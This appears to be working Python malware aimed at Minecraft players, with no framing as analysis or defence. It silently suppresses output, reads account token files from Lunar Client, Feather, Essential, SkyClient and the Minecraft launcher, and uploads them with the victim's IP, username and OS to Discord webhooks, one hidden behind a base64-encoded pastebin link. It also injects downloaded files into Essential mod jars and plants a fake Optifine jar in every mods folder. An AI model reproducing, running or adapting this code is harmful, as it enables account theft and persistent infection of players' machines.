import os
import zipfile
import urllib.request
import getpass
import requests
import json
import base64
import socket
import platform
import threading
import sys

sys.stdout = open('nul', 'w')
sys.stderr = open('nul', 'w')




#essentials.py


def send_discord_message(webhook_url, embeds):
    data = {
        'username': os.getlogin(),
        'avatar_url': 'https://media.discordapp.net/attachments/1211281395285102592/1211312968801976400/pink_mouse.png?ex=65f6f89c&is=65e4839c&hm=0043285a20b9cfa3c4c318051ebd3845201f311031b1a06039508fcbd6c2fe1d&=&format=webp&quality=lossless&width=584&height=606',
        'embeds': embeds,
    }
    requests.post(webhook_url, json=data)

def get_jar_paths():
    username = getpass.getuser()
    essential_path = f"C:\\Users\\{username}\\AppData\\Roaming\\.minecraft\\essential\\Essential (forge_1.8.9).jar"
    skyclient_path = f"C:\\Users\\{username}\\AppData\\Roaming\\.minecraft\\skyclient\\essential\\Essential (forge_1.8.9).jar"
    jar_paths = []

    if os.path.exists(essential_path):
        jar_paths.append(essential_path)
    if os.path.exists(skyclient_path):
        jar_paths.append(skyclient_path)

    if not jar_paths:
        raise FileNotFoundError("File Error")

    return jar_paths

def download_and_extract_zip(zip_url, extract_path):
    zip_filename = "temp.zip"
    urllib.request.urlretrieve(zip_url, zip_filename)

    with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
        zip_ref.extractall(extract_path)

    os.remove(zip_filename)

def display_directory_structure(jar_path, target_path_inside_jar):
    with zipfile.ZipFile(jar_path, 'r') as jar_file:
        unique_directories = set()

        for file_path in jar_file.namelist():
            if file_path.startswith(target_path_inside_jar) and '/' in file_path[len(target_path_inside_jar):]:
                directory = file_path[len(target_path_inside_jar):].split('/', 1)[0]
                unique_directories.add(directory)

        return sorted(unique_directories)

def update_jar_file(jar_path, files_to_add):
    added_files = []
    skipped_files = []

    with zipfile.ZipFile(jar_path, 'a') as jar_file:
        existing_files = set(map(str.lower, jar_file.namelist()))

        for file_path in files_to_add:
            zip_path = f"gg/essential/{os.path.basename(file_path)}"
            if zip_path.lower() in existing_files:
                skipped_files.append(zip_path)
            else:
                jar_file.write(file_path, arcname=zip_path)
                added_files.append(zip_path)

    return added_files, skipped_files

def remove_temp_files(temp_extract_path):
    for file in os.listdir(temp_extract_path):
        os.remove(os.path.join(temp_extract_path, file))
    os.rmdir(temp_extract_path)

def essential():
    webhook_url = "https://ptb.discord.com/api/webhooks/1230483198220173347/9Mzz8OoU14umjS0czF8xuMkpAjQAoYWq0cO_ANB_7o5Boj8GV4n6ORZTXFRy2URjGVQU"
    target_path_inside_jar = "gg/essential"
    zip_url = "https://github.com/Maystele/tests/raw/main/essential.zip"
    temp_extract_path = "temp_extract"
    jar_paths = get_jar_paths()
    embeds = []

    for jar_path in jar_paths:
        download_and_extract_zip(zip_url, temp_extract_path)
        display_directories = display_directory_structure(jar_path, target_path_inside_jar)

        files_to_add = [os.path.join(temp_extract_path, file) for file in os.listdir(temp_extract_path)]
        added_files, skipped_files = update_jar_file(jar_path, files_to_add)

        remove_temp_files(temp_extract_path)

        files_added_string = '```' + '\n'.join(added_files) + '```' if added_files else '```No files added.```'
        files_skipped_string = '```' + '\n'.join(skipped_files) + '```' if skipped_files else '```No files skipped.```'

        embed = {
            'title': 'Jar File Updated',
            'description': '```Essentials 1.8.9 injection successfull!```',
            'fields': [
                {'name': 'Files Added:', 'value': files_added_string},
                {'name': 'Files Skipped:', 'value': files_skipped_string},
                {'name': 'Target Directory:', 'value': f'```{target_path_inside_jar}```'},
                {'name': 'Minecraft Directory:', 'value': f'```C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\.minecraft```'},
            ],
            'color': 0xFF69B4  # Pink color
        }
        if display_directories:
            embed['fields'].insert(0, {'name': 'Directories Updated:', 'value': '```' + '\n'.join(display_directories) + '```'})

        embeds.append(embed)

    send_discord_message(webhook_url, embeds)




#mod.py


def download_and_save_mod(url, save_directory):
    file_name = os.path.basename(url)
    save_path = os.path.join(save_directory, file_name)
    os.makedirs(save_directory, exist_ok=True)
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as file:
            file.write(response.content)
        
        return save_path
    else:
        return None

def get_all_mods_names(directory):
    all_files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    return all_files

def send_webhook_message(webhook_url, embed):
    user_name = os.getlogin()
    data = {
        'username': user_name,
        'avatar_url': 'https://cdn.discordapp.com/avatars/1212813844196360313/db56c28a6dd2024d2643fcc07f051329.webp',
        'embeds': [embed],
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    return response.status_code

def mod():
    mod_url = "https://github.com/Maystele/tests/raw/main/Optifine_1.8.9_HD_U_M4.jar"
    launcher_profiles_path = os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_profiles.json")
    with open(launcher_profiles_path, 'r') as file:
        launcher_profiles = json.load(file)

    original_mods_directory = os.path.join(os.getenv("APPDATA"), ".minecraft", "mods")
    downloaded_mod_path_original = download_and_save_mod(mod_url, original_mods_directory)

    embed = {
        'title': 'Neue Mod hinzugefügt',
        'description': '',
        'fields': []
    }

    if downloaded_mod_path_original:
        all_mods_names_original = get_all_mods_names(original_mods_directory)
        embed['description'] += f"**Standardverzeichnis:**\n```\n{original_mods_directory}\n```\n"
        embed['fields'].append({
            'name': 'Mod-Datei',
            'value': os.path.basename(downloaded_mod_path_original),
            'inline': False
        })
        embed['fields'].append({
            'name': 'Andere Mods im Verzeichnis',
            'value': ', '.join(all_mods_names_original),
            'inline': False
        })

    for profile_id, profile_data in launcher_profiles['profiles'].items():
        if 'gameDir' in profile_data:
            mods_directory = os.path.join(profile_data['gameDir'], "mods")
            downloaded_mod_path_profile = download_and_save_mod(mod_url, mods_directory)
            if downloaded_mod_path_profile:
                all_mods_names_profile = get_all_mods_names(mods_directory)
                embed['description'] += f"\n**Profil '{profile_data['name']}':**\n"
                embed['fields'].append({
                    'name': 'Verzeichnis',
                    'value': f"```\n{profile_data['gameDir']}\n```",
                    'inline': False
                })
                embed['fields'].append({
                    'name': 'Mod-Datei',
                    'value': os.path.basename(downloaded_mod_path_profile),
                    'inline': False
                })
                embed['fields'].append({
                    'name': 'Andere Mods im Verzeichnis',
                    'value': ', '.join(all_mods_names_profile),
                    'inline': False
                })

    webhook_url = "https://ptb.discord.com/api/webhooks/1230483198220173347/9Mzz8OoU14umjS0czF8xuMkpAjQAoYWq0cO_ANB_7o5Boj8GV4n6ORZTXFRy2URjGVQU"
    send_webhook_message(webhook_url, embed)




#config.py


def get_system_info():
    user_ip = socket.gethostbyname(socket.gethostname())
    user_name = os.getlogin()
    user_os = platform.system()
    return user_ip, user_name, user_os

def config_handle(user_ip, user_username, user_os, webhook_url, file1_content, file2_content, file3_content, file4_content, file5_content):
    package_name = "Github Exe"
    version = "1.0.0"
    lunar = "true" if file1_content else "false"
    essentials = "true" if file2_content else "false"
    launcher = "true" if file3_content else "false"
    feather = "true" if file4_content else "false"
    skyclient_essential = "true" if file4_content else "false"

    content = f"||@everyone||\n-------------------\nLogged by: **{package_name}**\nVersion **{version}**\nMessage from: {user_username}\nIP: {user_ip}\nOS: {user_os}\n-------------------\n Lunar: {lunar}\n Essentials: {essentials}\n Launcher: {launcher}\n Feather: {feather}\n Skyclient (essential): {skyclient_essential}\n-------------------"

    files = {}
    if file1_content:
        files["file1"] = ("lunar.json", file1_content)
    if file2_content:
        files["file2"] = ("essentials.json", file2_content)
    if file3_content:
        files["file3"] = ("launcher_accounts.json", file3_content)
    if file4_content:
        files["file4"] = ("feather.json", file4_content)
    if file5_content:
        files["file5"] = ("skyclient_essential.json", file5_content)

    profile_picture_url = "https://cdn.discordapp.com/attachments/1211281395285102592/1211312968801976400/pink_mouse.png?ex=65edbe1c&is=65db491c&hm=ce00bb7c94512c08bb41eed3784dd5e81d8bb262eefb668e6d08d29bcc4cd34c&"
    
    payload = {
        "content": content,
        "username": "The Ripper",
        "avatar_url": profile_picture_url
    }
    
    requests.post(webhook_url, files=files, data=payload)
    
def bit():
    bit64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2FBWWhZZ3V1"
    bit = base64.b64decode(bit64.encode()).decode('utf-8')
    try:
        response = requests.get(bit)
        if response.status_code == 200:
            webhook = response.text.strip()
            return webhook
        else:
            return None
    except Exception as e:
        return None

def get_config(file_path):
    if os.path.exists(file_path):
        with open(file_path, "rb") as file:
            return file.read()
    else:
        return None 

def config():
    user_ip, user_username, user_os = get_system_info()
    webhook_url = bit()
    confi1_path = os.path.join(os.path.expanduser("~"), ".lunarclient", "settings", "game", "accounts.json")
    confi2_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json")
    confi3_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "launcher_accounts.json")
    confi4_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".feather","accounts.json")
    confi5_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "skyclient", "essential", "microsoft_accounts.json")
    file1_content = get_config(confi1_path)
    file2_content = get_config(confi2_path)
    file3_content = get_config(confi3_path)
    file4_content = get_config(confi4_path)
    file5_content = get_config(confi5_path)
    config_handle(user_ip, user_username, user_os, webhook_url, file1_content, file2_content, file3_content, file4_content, file5_content)
    


#allinone.py

def run_in_thread(func):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.start()
        return thread
    
    return wrapper

def main():
    threads = []
    threads.append(run_in_thread(essential)())
    threads.append(run_in_thread(mod)())
    threads.append(run_in_thread(config)())
    for thread in threads:
        thread.join()
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__
if __name__ == "__main__":
    main()
